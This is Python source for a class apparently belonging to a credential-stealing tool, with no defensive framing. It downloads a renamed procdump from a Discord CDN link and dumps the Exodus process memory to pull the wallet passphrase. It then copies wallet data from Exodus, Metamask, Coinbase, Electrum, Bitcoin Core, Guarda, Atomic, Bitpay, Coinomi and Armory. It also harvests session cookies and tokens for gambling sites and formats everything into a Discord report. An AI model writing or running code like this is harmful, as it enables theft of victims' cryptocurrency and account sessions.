class W4ll3ts:

    def __init__(self):
        self.amountfiles = 0
        self.exoamountfiles = 0
        self.metaamountfiles = 0
        self.elecamountfiles = 0
        self.b1tcoinamountfiles = 0
        self.guardaamountfiles = 0
        self.atomicamountfiles = 0
        self.bitpayamountfiles = 0
        self.coinomiamountfiles = 0
        self.armoryamountfiles = 0
        self.coinbaseamountfiles = 0
        self.amountsites = 0
        self.county = 0
        self.county2 = 0
        self.contenttosend = """
``|_`` :open_file_folder: ``Wallets``"""
        self.pathyy = os.path.join(P4THF0LDR, "Wallets")
        os.mkdir(self.pathyy)
        if os.path.exists(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","procvesp111.exe")):
            pass
        else:open(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","procvesp111.exe"),"wb").write(requests.get("https://cdn.discordapp.com/attachments/1094804863067623530/1103522104978198558/procdump.exe").content)
        try:
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Exodus")
            self.stealexo(self.path+"\\exodus.wallet")
        except:
            pass
        try:
            paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","3dge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
            profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
            self.stealmeta(paths, profs)
        except:
            pass
        try:
            paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","3dge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
            profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
            self.coinbaseextension(paths, profs)
        except:
            pass
        try:
            self.electrum()
        except:
            pass
        try:
            self.b1tcoinorg()
        except:
            pass
        try:
            self.GUARDA()
        except:
            pass
        try:
            self.ATOMIC()
        except:
            pass
        try:
            self.B1Tpay()
        except:
            pass
        try:
            self.coinomi()
        except:
            pass
        try:
            self.armory()
        except:
            pass
        try:
            self.gamblingsites()
        except:
            pass

    def coinbaseextension(self, paths, profs):
        metapath = os.path.join(self.pathyy, "Coinbase")
        os.mkdir(metapath)
        for i in paths:
            for I in profs:
                try:
                    Path = os.path.join(i,I,"Local Extension Settings","hnfanknocfeofbddgcijnmhnfnkdnaad")
                    self.coinbaseamountfiles += 1;self.county2 += 1
                    shutil.copytree(Path,metapath+f"\\Coinbase_{self.county2}")
                except:
                    pass
        if self.coinomiamountfiles > 0:
            self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.coinomiamountfiles}) Coinbase Files``"""

    def stealexo(self, path):
        passcode = ""
        try:
            procID = ""
            smallest = 0
            for process in psutil.process_iter(['pid','create_time','name']):
                if process.info['name'] == 'Exodus.exe':
                    if int(process.info['create_time']) > smallest:
                        smallest = int(process.info['create_time'])
                        procID = process.info['pid']
            subprocess.run([os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","procvesp111.exe"), '-accepteula','-ma', str(procID), os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","777exodus.dmp")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            passcode = str(open(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","777exodus.dmp"),'rb').read()).split(r"passphrase%22%3A%22")[1].split(r"%")[0]
        except:
            pass
        try:os.remove(os.path.join(os.environ["USERPROFILE"], "AppData","Local","Temp","777exodus.dmp"))
        except:pass
        exopath = os.path.join(self.pathyy, "Exodus")
        os.mkdir(exopath)
        P=os.listdir(path)
        for i in P:
            self.exoamountfiles += 1
            shutil.copy(path+f"\\{i}",exopath+f"\\{i}")
        if passcode == "":passcode = "Not Found"
        self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.exoamountfiles}) Exodus Files``
``|   |   |_``:lock: ``Exodus Password : {passcode}``"""

    def stealmeta(self, paths, profs):
        metapath = os.path.join(self.pathyy, "Metamask")
        os.mkdir(metapath)
        for i in paths:
            if "Opera Software" in i:
                try:
                    Path = os.path.join(i,"Local Extension Settings","nkbihfbeogaeaoehlefnkodbefgpgknn")
                    shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                    self.metaamountfiles += 1;self.county += 1
                except:
                    pass
            else:
                for I in profs:
                    try:
                        if "3dge" in i:
                            i = i.replace("3dge","Edge")
                            lastpart = "ejbalbakoplchlghecdalmeeeajnimhm"
                            Path = os.path.join(i,I,"Local Extension Settings",lastpart)
                            shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                            self.metaamountfiles += 1;self.county += 1
                        else:
                            lastpart = "nkbihfbeogaeaoehlefnkodbefgpgknn"
                            Path = os.path.join(i,I,"Local Extension Settings",lastpart)
                            shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                            self.metaamountfiles += 1;self.county += 1
                    except:
                        pass
        if self.metaamountfiles > 0:
            self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.metaamountfiles}) Metamask Files``"""

    def electrum(self):
        elecpath = os.path.join(self.pathyy, "Electrum")
        os.mkdir(elecpath)
        elec_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Electrum","wallets")
        P=os.listdir(elec_path)
        for i in P:
            self.elecamountfiles += 1
            shutil.copy(elec_path+f"\\{i}",elecpath+f"\\{i}")
        self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.elecamountfiles}) Electrum Files``"""

    def b1tcoinorg(self):
        bItcoinorg = os.path.join(self.pathyy, "Bitcoin")
        os.mkdir(bItcoinorg)
        folderpath = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Bitcoin","wallets")
        P=os.listdir(folderpath)
        for i in P:
            self.b1tcoinamountfiles += 1
            shutil.copytree(folderpath+f"\\{i}",bItcoinorg+f"\\{i}")
        self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.b1tcoinamountfiles}) Bitcoin Wallet Files``"""

    def GUARDA(self):
        GUArda = os.path.join(self.pathyy, "Guarda")
        os.mkdir(GUArda)
        folderpath = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Guarda")
        P=os.listdir(folderpath)
        for i in P:
            try:
                shutil.copytree(folderpath+f"\\{i}",GUArda+f"\\{i}")
                self.guardaamountfiles += 1
            except:
                try:
                    shutil.copy(folderpath+f"\\{i}",GUArda+f"\\{i}")
                    self.guardaamountfiles += 1
                except:
                    pass
        if self.guardaamountfiles > 0:
            self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.guardaamountfiles}) Guarda Files``"""

    def ATOMIC(self):
        atomicc = os.path.join(self.pathyy, "Atomic")
        os.mkdir(atomicc)
        folderpath = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "atomic")
        P=os.listdir(folderpath)
        for i in P:
            try:
                shutil.copytree(folderpath+f"\\{i}",atomicc+f"\\{i}")
                self.atomicamountfiles+=1
            except:
                try:
                    shutil.copy(folderpath+f"\\{i}",atomicc+f"\\{i}")
                    self.atomicamountfiles+=1
                except:
                    pass
        if self.atomicamountfiles > 0:
            self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.atomicamountfiles}) Atomic Files``"""

    def B1Tpay(self):
        bitpay = os.path.join(self.pathyy, "Bitpay")
        os.mkdir(bitpay)
        folderpath = os.path.join(os.environ["USERPROFILE"], ".bitpay")
        P=os.listdir(folderpath)
        for i in P:
            self.bitpayamountfiles += 1
            try:
                shutil.copytree(folderpath+f"\\{i}",bitpay+f"\\{i}")
            except:
                try:
                    shutil.copy(folderpath+f"\\{i}",bitpay+f"\\{i}")
                except:
                    pass
        if self.bitpayamountfiles > 0:
            self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.bitpayamountfiles}) Bitpay Files``"""

    def coinomi(self):
        COINOMI = os.path.join(self.pathyy, "Coinomi")
        os.mkdir(COINOMI)
        folderpath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Coinomi","Coinomi","wallets")
        P=os.listdir(folderpath)
        for i in P:
            if str(i).endswith(".wallet"):
                self.coinomiamountfiles += 1
                shutil.copy(folderpath+f"\\{i}",COINOMI+f"\\{i}")
        self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.coinomiamountfiles}) Coinomi Files``"""

    def armory(self):
        ARMORY = os.path.join(self.pathyy, "Armory")
        os.mkdir(ARMORY)
        folderpath = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Armory")
        P=os.listdir(folderpath)
        for i in P:
            try:
                self.armoryamountfiles += 1
                shutil.copy(folderpath+f"\\{i}",ARMORY+f"\\{i}")
            except:
                pass
        if self.armoryamountfiles > 0:
            self.contenttosend += f"""
``|   |_``:page_facing_up: ``({self.armoryamountfiles}) Armory Files``"""

    def _luckyblock(self,path):
        for f in os.listdir(path):
            if f.endswith(".log") or f.endswith(".ldb"):
                try:
                    file = open(path+"\\"+f,'r',errors="ignore").read()
                    if "https://www.luckyblock.com" in str(file) or "https://luckyblock.com" in str(file) or "luckyblock.com" in str(file):
                        luckyblocksplit = file.split("luckyblock.com")
                        for tokens in luckyblocksplit:
                            t=str(re.findall(r'"[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+\.[a-zA-Z0-9-_]+"',tokens))
                            if len(t) > 200:
                                if t not in self.luckyblock_tokens:
                                    try:
                                        t= '"' + t.split('"')[1].split('"')[0] + '"'
                                    except:
                                        pass
                                    self.luckyblock_tokens.append(t)
                except:
                    pass

    def gamblingsites(self):
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
        profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        Gamblingsites = os.path.join(self.pathyy, "GamblingSites")
        os.mkdir(Gamblingsites)
        try:
            if len(gambls1tes) > 0:
                f=open(Gamblingsites+"\\Sportsbet.io.txt","w+")
                for cooks in gambls1tes:
                    if len(cooks) > 3:
                        f.write(f"\n(Cookies) token : {cooks}\n\n"+"-"*35)
                        self.amountsites += 1
                f.close()
        except:
            pass
        try:
            if len(betsio) > 0:
                f=open(Gamblingsites+"\\Bets.io.txt","w+")
                for cooks in betsio:
                    if len(cooks) > 3:
                        f.write(f"\n(Cookies) _casino_session : {cooks}\n\n"+"-"*35)
                        self.amountsites += 1
                f.close()
        except:
            pass
        try:
            if len(bitcasino) > 0:
                f=open(Gamblingsites+"\\Bitcasino.io.txt","w+")
                for cooks in bitcasino:
                    if len(cooks) > 3:
                        f.write(f"\n(Cookies) token : {cooks}\n\n"+"-"*35)
                        self.amountsites += 1
                f.close()
        except:
            pass
        try:
            if len(mystake) > 0:
                f=open(Gamblingsites+"\\Mystake.bet.txt","w+")
                for cooks in mystake:
                    if len(cooks) > 3:
                        f.write(f"\n(Cookies) AppAuth : {cooks}\n\n"+"-"*35)
                        self.amountsites += 1
                f.close()
        except:
            pass
        try:
            if len(stakecom) > 0:
                f=open(Gamblingsites+"\\Stake.com.txt","w+")
                for cooks in stakecom:
                    if len(cooks) > 3:
                        f.write(f"\n(Cookies) session : {cooks}\n\n"+"-"*35)
                        self.amountsites += 1
                f.close()
        except:
            pass
        try:
            if len(wildio) > 0:
                f=open(Gamblingsites+"\\Wild.io.txt","w+")
                for cooks in wildio:
                    if len(cooks) > 3:
                        f.write(f"\n(Cookies) _casino_session : {cooks}\n\n"+"-"*35)
                        self.amountsites += 1
                f.close()
        except:
            pass
        try:
            if len(coinzinoio) > 0:
                f=open(Gamblingsites+"\\Coinzino.io.txt","w+")
                for cooks in coinzinoio:
                    if len(cooks) > 3:
                        f.write(f"\n(Cookies) SESSION : {cooks}\n\n"+"-"*35)
                        self.amountsites += 1
                f.close()
        except:
            pass
        try:
            if len(winzio) > 0:
                f=open(Gamblingsites+"\\Winz.io.txt","w+")
                for cooks in winzio:
                    if len(cooks) > 3:
                        f.write(f"\n(Cookies) _casino_session : {cooks}\n\n"+"-"*35)
                        self.amountsites += 1
                f.close()
        except:
            pass
        try:
            self.luckyblock_tokens = []
            for i in paths:
                if "Opera Software" in i:
                    newpath = os.path.join(i, "Local Storage", "leveldb")
                    self._luckyblock(newpath)
                else:
                    for I in profs:
                        newpath = os.path.join(i,I, "Local Storage", "leveldb")
                        self._luckyblock(newpath)
            if len(self.luckyblock_tokens) >0:
                f=open(Gamblingsites+"\\Luckyblock.com.txt","w+")
                for toto in self.luckyblock_tokens:
                    f.write(f"\n(Local Storage) token : {toto}\n\n"+"-"*35)
                    self.amountsites += 1
                f.close()
        except:
            pass

        if self.amountsites > 0:
            self.contenttosend += f"""
``|   |_``:globe_with_meridians: ``({self.amountsites}) Gambling Sites Cookies``"""
        
    def __repr__(self):
        if self.exoamountfiles+self.metaamountfiles+self.elecamountfiles+self.b1tcoinamountfiles+self.guardaamountfiles+self.atomicamountfiles+self.bitpayamountfiles+self.coinomiamountfiles+self.armoryamountfiles+self.coinomiamountfiles+self.amountsites == 0:
            self.contenttosend += f"""
``|   |_``:x: ``No Wallet Found (hes broke)``"""
        return self.contenttosend